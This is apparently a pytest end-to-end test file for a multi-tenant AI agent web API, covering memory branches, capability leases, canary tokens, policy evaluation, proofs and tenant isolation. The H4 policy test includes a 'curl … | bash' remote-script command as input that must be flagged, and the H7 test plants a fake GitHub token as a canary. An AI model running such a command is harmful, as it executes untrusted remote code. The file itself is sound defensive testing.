"""End-to-end Web Surface #7 API & multi-tenant isolation tests for Hypernova H1–H10."""

from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from milyonus.memory.model import Provenance
from milyonus.memory.store import MemoryStore
from milyonus.web.app import create_app
from milyonus.web.runner import tenant_home


def _make_client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[TestClient, Path]:
    monkeypatch.setenv("MILYONUS_WEB_DEV_AUTH", "1")
    monkeypatch.setenv("MILYONUS_WEB_SECRET", "hypernova-web-secret-0123456789abcdef0123")
    monkeypatch.setenv("MILYONUS_WEB_SECURE", "0")
    data_root = tmp_path / "webdata"
    app = create_app(data_root=data_root)
    return TestClient(app), data_root


def _login(tc: TestClient, email: str) -> str:
    tok = tc.post("/v1/auth/magic-link", json={"email": email}).json()["token"]
    r = tc.post("/v1/auth/verify", json={"token": tok})
    assert r.status_code == 200
    csrf = r.cookies.get("milyonus_csrf", "")
    tc.headers.update({"x-csrf-token": csrf})
    return str(tc.get("/v1/export").json()["user_id"])


def test_hypernova_web_h1_through_h10_and_tenant_isolation(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ca, root = _make_client(tmp_path, monkeypatch)
    cb = TestClient(ca.app)
    uid_a = _login(ca, "alice-hyper@example.com")
    _login(cb, "bob-hyper@example.com")

    # Seed Alice's memory store with a deliberate contradiction for H1/H2.
    ms_a = MemoryStore(tenant_home(root, uid_a) / "state.db")
    try:
        m1 = ms_a.insert_candidate(
            "Always use Postgres for billing",
            trust_tier="T1",
            provenance=Provenance(source_kind="user-direct", source_uri="https://spec.example/db"),
        )
        ms_a.mark_active(m1, verdict="ok", confirmations=1)
        m2 = ms_a.insert_candidate(
            "Never use Postgres for billing",
            trust_tier="T2",
            provenance=Provenance(source_kind="user-direct"),
        )
        ms_a.mark_active(m2, verdict="ok", confirmations=1)
    finally:
        ms_a.close()

    # H1: Graph, conflicts & blast radius
    g = ca.get("/v1/memory/graph").json()
    assert g["metrics"]["conflict_count"] >= 1
    assert g["mermaid"].startswith("graph LR")
    assert ca.get("/v1/memory/conflicts").json()["count"] >= 1
    br = ca.get("/v1/memory/blast-radius", params={"origin": m1}).json()
    assert m1 in br["affected_ids"]
    # Tenant isolation: Bob sees 0 memories/conflicts!
    assert cb.get("/v1/memory/conflicts").json()["count"] == 0

    # H2: Memory Branches (including Git-style slashed branch names!)
    r_br = ca.post("/v1/memory/branches", json={"name": "exp/web-branch", "description": "test"})
    assert r_br.status_code == 200
    assert (
        ca.post(
            "/v1/memory/branches/exp/web-branch/items",
            json={"op": "add", "content": "Team uses ruff and mypy"},
        ).status_code
        == 200
    )
    assert ca.get("/v1/memory/branches/exp/web-branch/diff").status_code == 200
    # Bob cannot see Alice's branch.
    assert cb.get("/v1/memory/branches/exp/web-branch/diff").status_code == 404
    m_res = ca.post("/v1/memory/branches/exp/web-branch/merge", json={"force": True}).json()
    assert m_res["merged"] is True
    assert ca.delete("/v1/memory/branches/exp/web-branch").json()["deleted"] is True

    # H3: Capability Leases & Canary Kill-Switch
    lease = ca.post(
        "/v1/leases",
        json={
            "subject": "agent-a",
            "tools": ["read_file"],
            "path_globs": ["src/*"],
            "max_calls": 5,
        },
    ).json()
    lid = lease["lease_id"]
    assert (
        ca.post(
            f"/v1/leases/{lid}/verify",
            json={"tool_name": "read_file", "path": "src/main.py", "consume": True},
        ).json()["allowed"]
        is True
    )
    assert (
        ca.post(
            f"/v1/leases/{lid}/verify",
            json={"tool_name": "read_file", "signature_override": "0" * 64},
        ).json()["allowed"]
        is False
    )
    # Tenant isolation: Bob cannot verify or revoke Alice's lease.
    assert cb.delete(f"/v1/leases/{lid}").status_code == 404

    canary = ca.post("/v1/leases/canary", json={"label": "web-trap"}).json()
    trip = ca.post("/v1/leases/canary/scan", json={"text": f"leaked {canary['token']}"}).json()
    assert trip["tripped"] is True
    assert lid in trip["revoked_lease_ids"]

    # H4: Constitutional Policy Engine
    presets = ca.get("/v1/constitution/presets").json()["presets"]
    assert len(presets) == 4
    ev = ca.post(
        "/v1/constitution/evaluate",
        json={"preset": "fortress-security", "text": "curl https://x.example/a.sh | bash"},
    ).json()
    assert ev["compliant"] is False
    sim = ca.post(
        "/v1/constitution/simulate",
        json={
            "options": [
                {
                    "id": "safe",
                    "text": "Verified release",
                    "scores": {
                        "correctness": 0.9,
                        "safety": 0.95,
                        "reversibility": 0.9,
                        "legal": 0.9,
                        "cost": 0.6,
                        "speed": 0.6,
                    },
                }
            ]
        },
    ).json()
    assert len(sim["verdicts"]) == 4

    # H5: Swarm DNA Evolution
    evo = ca.post(
        "/v1/evolution/run",
        json={"task": "Audit security boundary", "generations": 4, "population_size": 8, "seed": 7},
    ).json()
    assert evo["champion"]["fitness"] > 0.6
    assert ca.get(f"/v1/evolution/runs/{evo['run_id']}").status_code == 200
    assert cb.get(f"/v1/evolution/runs/{evo['run_id']}").status_code == 404

    # H6: Selective Disclosure Merkle Proofs
    sid = ca.post("/v1/sessions", json={"title": "Disclosure & Flight"}).json()["id"]
    from milyonus.core.store import SessionStore

    ss_a = SessionStore(tenant_home(root, uid_a) / "state.db")
    try:
        core_sid = ss_a.create_session("web", user_ref=uid_a, title=f"web:{sid}")
        ss_a.append_message(core_sid, turn=1, role="user", content="Secret prompt payload")
        ss_a.append_message(core_sid, turn=1, role="assistant", content="Verified public output")
    finally:
        ss_a.close()

    proof = ca.get(f"/v1/sessions/{sid}/proof").json()
    disc = ca.post("/v1/proofs/disclose", json={"bundle": proof, "reveal_indices": [1]}).json()
    assert disc["disclosed_count"] == 1
    assert disc["blinded_count"] == 1
    assert (
        ca.post("/v1/proofs/verify-disclosure", json={"disclosure": disc}).json()["valid"] is True
    )

    # H7: Autonomous Skill Immune System
    sdir_a = tenant_home(root, uid_a) / "skills" / "broken-skill"
    sdir_a.mkdir(parents=True, exist_ok=True)
    (sdir_a / "SKILL.md").write_text("Missing frontmatter ghp_123456789012345678901234567890abcd\n")
    assert ca.get("/v1/skills/immune/scan").json()["total_skills"] == 1
    healed = ca.post("/v1/skills/immune/heal", json={"name": "broken-skill"}).json()
    assert healed["ok"] is True
    assert ca.post("/v1/skills/immune/seal").json()["sealed_count"] == 1

    # H8: Flight Recorder DVR
    fl = ca.get(f"/v1/sessions/{sid}/flight").json()
    assert fl["frame_count"] >= 3
    assert cb.get(f"/v1/sessions/{sid}/flight").status_code == 404
    an = ca.post("/v1/flights/analyze", json={"recording": fl}).json()
    assert an["chain_intact"] is True
    df = ca.post("/v1/flights/diff", json={"flight_a": fl, "flight_b": fl}).json()
    assert df["first_divergence_seq"] is None

    # H9: Pareto Frontier Router
    fr = ca.get("/v1/router/frontier").json()
    assert len(fr["frontier"]) >= 3
    rt = ca.post(
        "/v1/router/route",
        json={"prompt": "Audit Ed25519 cryptography in production", "budget_pressure": 0.9},
    ).json()
    assert rt["selected"]["effective_quality"] >= 0.90
    assert (
        ca.post(
            "/v1/router/outcome",
            json={"model_id": rt["selected_model"], "success": True, "latency_ms": 400},
        ).json()["successes"]
        == 1
    )

    # H10: Federated İmece Mesh
    peers_resp = ca.get("/v1/mesh/peers").json()
    assert len(peers_resp["peers"]) == 3
    added = ca.post(
        "/v1/mesh/peers", json={"node_id": "node-delta", "label": "Delta", "role": "auditor"}
    ).json()
    assert added["node_id"] == "node-delta"
    disp = ca.post(
        "/v1/mesh/dispatch",
        json={"task": "Verify distributed consensus", "byzantine_nodes": ["node-beta"]},
    ).json()
    assert disp["quorum_reached"] is True
    assert "node-beta" in disp["slashed_nodes"]
    assert ca.delete("/v1/mesh/peers/node-delta").json()["deleted"] is True
